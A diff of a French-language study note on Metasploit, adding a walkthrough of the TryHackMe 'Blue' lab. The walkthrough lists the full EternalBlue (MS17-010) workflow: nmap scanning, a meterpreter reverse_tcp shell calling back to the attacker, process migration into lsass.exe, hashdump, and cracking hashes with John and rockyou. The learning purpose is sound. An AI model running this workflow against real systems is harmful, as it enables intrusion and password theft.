@@ -53,9 +53,9 @@ Réaliser les labs suivants sur TryHackMe :
 
 ---
 
-### 📝 Fiche Récap : Commandes Essentielles Metasploit
+## 📝 Fiche Récap : Commandes Essentielles Metasploit
 
-#### **1. Le Vocabulaire de base**
+### **1. Le Vocabulaire de base**
 
 - **Vulnerability (Vulnérabilité) :** Une faille de conception ou de code sur le système cible.
 - **Exploit :** Le bout de code qui tire parti de cette vulnérabilité (le bélier).
@@ -63,7 +63,7 @@ Réaliser les labs suivants sur TryHackMe :
   - *Singles :* Payloads autonomes, tout-en-un (ex: `.../pingback_reverse_tcp`).
   - *Staged :* Payloads envoyés en plusieurs petits morceaux (ex: `.../meterpreter/reverse_tcp`).
 
-#### **2. Navigation et Recherche (msfconsole)**
+### **2. Navigation et Recherche (msfconsole)**
 
 - **`msfconsole`** : Lance le framework Metasploit depuis ton terminal.
 - **`search <mot-clé>`** : Cherche un module (ex: `search apache`, `search type:auxiliary telnet`, `search ms17-010`).
@@ -71,7 +71,7 @@ Réaliser les labs suivants sur TryHackMe :
 - **`info`** : Affiche les détails complets du module sélectionné (auteur, description, fiabilité/rank).
 - **`back`** : Quitte le module actuel pour revenir au menu principal.
 
-#### **3. Configuration des paramètres**
+### **3. Configuration des paramètres**
 
 - **`show options`** : Affiche les paramètres requis pour faire fonctionner le module (RHOSTS, LPORT, etc.).
 - **`show payloads`** : Affiche les charges utiles compatibles avec ton exploit actuel.
@@ -79,7 +79,7 @@ Réaliser les labs suivants sur TryHackMe :
 - **`setg <paramètre> <valeur>`** : Configure une option *globalement* pour qu'elle reste sauvegardée (ex: `setg RHOSTS 10.10.19.23`).
 - **`unset <paramètre>`** (ou `unset all`) : Efface la valeur d'un ou plusieurs paramètres.
 
-#### **4. Exploitation et Gestion des Sessions**
+### **4. Exploitation et Gestion des Sessions**
 
 - **`exploit`** (ou `run`) : Lance l'attaque.
 - **`exploit -z`** : Lance l'attaque et met directement la session en arrière-plan dès qu'elle s'ouvre.
@@ -91,6 +91,89 @@ Réaliser les labs suivants sur TryHackMe :
 
 ## 🟦 Résolution Lab Ethernal Blue
 
-[TryHackMe - Metasploit Introduction](https://tryhackme.com/room/blue)
+[TryHackMe - Blue (Exploitation EternalBlue)](https://tryhackme.com/room/blue)
 
 ![blue](/images/2026-03-19-18-14-26.png)
+
+### **Task 1 : Recon (Reconnaissance)**
+
+- **Objectif :** Scanner la cible pour identifier les services et les vulnérabilités.
+- **Action :** Utilisation de `nmap -sS -sV --script vuln <IP_Cible>`.
+- **Résultat :** Découverte des ports ouverts (135, 139, 445) et confirmation de la vulnérabilité critique **MS17-010** (EternalBlue) sur le service SMBv1.
+
+![scan](/images/2026-03-19-18-26-01.png)
+
+### **Task 2 : Gain Access (Intrusion)**
+
+- **Objectif :** Exploiter la faille pour obtenir un accès à la machine.
+- **Action :** Utilisation de Metasploit avec le module `exploit/windows/smb/ms17_010_eternalblue` et le payload `windows/x64/meterpreter/reverse_tcp`.
+- **Résultat :** Obtention d'un shell **Meterpreter** direct sur la cible.
+
+![config](/images/2026-03-19-18-49-15.png)
+
+![win](/images/2026-03-19-18-54-36.png)
+
+### **Task 3 : Escalate (Élévation et Stabilisation)**
+
+- **Objectif :** S'assurer d'avoir les droits maximums et un accès stable qui ne plantera pas.
+- **Action :** Vérification des droits (déjà `NT AUTHORITY\SYSTEM`). Pour stabiliser, on liste les processus système en cours et on "migre" notre virus à l'intérieur de l'un d'eux (ex: `spoolsv.exe` ou `lsass.exe`).
+
+![migrate](/images/2026-03-19-19-02-13.png)
+
+### **Task 4 : Cracking (Vol de mots de passe)**
+
+- **Objectif :** Récupérer les mots de passe des utilisateurs de la machine.
+- **Action :** Dump de la base SAM de Windows pour récupérer les empreintes (hashs) NTLM de l'utilisateur "Jon".
+- **Cassage :** Utilisation de John The Ripper en local avec le dictionnaire `rockyou.txt` pour casser l'empreinte et obtenir le mot de passe en clair.
+
+![hashdump](/images/2026-03-19-19-08-52.png)
+
+![rockyou](/images/2026-03-19-19-14-31.png)
+
+### **Task 5 : Find flags (Fouille du système)**
+
+- **Objectif :** Prouver la compromission totale en trouvant des fichiers cachés.
+- **Action :** Utilisation de la fonction de recherche globale de Meterpreter pour localiser et lire les fichiers textes cachés à la racine (`C:\`), dans la base de configuration (`System32\config`) et dans les dossiers utilisateurs (`Users\...\Documents`).
+
+![badge](/images/2026-03-19-19-27-39.png)
+
+## 📝 Fiche Récap : Workflow Metasploit (Cas Pratique MS17-010)
+
+Voici l'ordre exact et les commandes utilisées pour compromettre un serveur Windows de A à Z avec Metasploit :
+
+### **1. Préparation de l'attaque**
+
+- `msfconsole` : Démarrer le framework.
+- `search ms17-010` : Trouver l'exploit correspondant à la faille.
+- `use exploit/windows/smb/ms17_010_eternalblue` : Sélectionner le module.
+
+### **2. Configuration des paramètres**
+
+- `set RHOSTS <IP_Cible>` : Définir l'adresse de la victime.
+- `set LHOST <IP_VPN_Attaquant>` : Définir notre adresse pour le retour de connexion.
+- `set payload windows/x64/meterpreter/reverse_tcp` : Forcer l'utilisation d'un shell avancé (Meterpreter).
+- `show options` : Vérifier que tout est correctement paramétré.
+- `exploit` (ou `run`) : Lancer l'attaque.
+
+### **3. Stabilisation dans Meterpreter**
+
+- `getuid` : Vérifier nos privilèges (idéalement `NT AUTHORITY\SYSTEM`).
+- `ps` : Lister les processus tournant sur la machine cible.
+- `migrate <PID>` : Déplacer discrètement notre session dans un processus stable (ex: un processus système légitime).
+
+### **4. Post-Exploitation (Pillage)**
+
+- `hashdump` : Extraire basiquement les empreintes de mots de passe à l'écran.
+- *Alternative Pro :* `run post/windows/gather/smart_hashdump` : Extrait et sauvegarde automatiquement les hashs dans un fichier texte (Loot) sur notre machine Kali.
+
+### **5. Navigation et Recherche Système**
+
+- `search -f flag*.txt` : Chercher un fichier spécifique sur tout le disque dur.
+- `cat C:/chemin/vers/le/fichier.txt` : Lire le contenu du fichier (attention à utiliser des `/` ou des `\\`).
+
+### **6. Cassage de mots de passe (Hors Metasploit, sur le terminal Kali)**
+
+- `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` : Décompresser le dictionnaire (à faire une seule fois).
+- `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` : Lancer l'attaque par dictionnaire sur l'empreinte volée.
+
+---
